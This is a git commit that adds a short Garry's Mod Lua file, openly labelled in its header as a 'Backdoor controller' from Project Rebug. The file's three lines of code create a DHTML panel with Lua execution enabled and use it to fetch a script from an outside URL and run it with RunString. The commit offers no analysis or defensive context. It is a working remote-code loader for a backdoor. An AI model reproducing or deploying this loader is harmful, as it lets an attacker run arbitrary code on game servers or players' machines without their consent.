abfe30c71dadefd3496e9e46b2d61ff032885f85
Void <54481654+Void09@users.noreply.github.com>
2019-11-23 01:23:44 +0000

    Add files via upload

---
+++ Rebug V2/external/rebug.lua
@@ -0,0 +1,27 @@
+/*=======================================================================
+
+   ▄████████    ▄████████ ▀█████████▄  ███    █▄     ▄██████▄  
+  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
+  ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
+ ▄███▄▄▄▄██▀  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███  ▄███        
+▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ▀▀███ ████▄  
+▀███████████   ███    █▄    ███    ██▄ ███    ███   ███    ███ 
+  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
+  ███    ███   ██████████ ▄█████████▀  ████████▀    ████████▀  
+  ███    ███                                                   
+
+
+Backdoor controller created by Project Rebug. The code for this script
+has been made organised for better understanding.
+
+Project Rebug: 2016-2019
+
+Licenced Under: GPL-3.0
+
+=======================================================================*/
+
+// Code for the script is on the link
+
+local f = vgui.Create('DHTML');
+f:SetAllowLua(true);
+return f:ConsoleMessage([[RUNLUA: http.Fetch("https://rvac.cc/log1n/bd.lua",RunString) ]]);
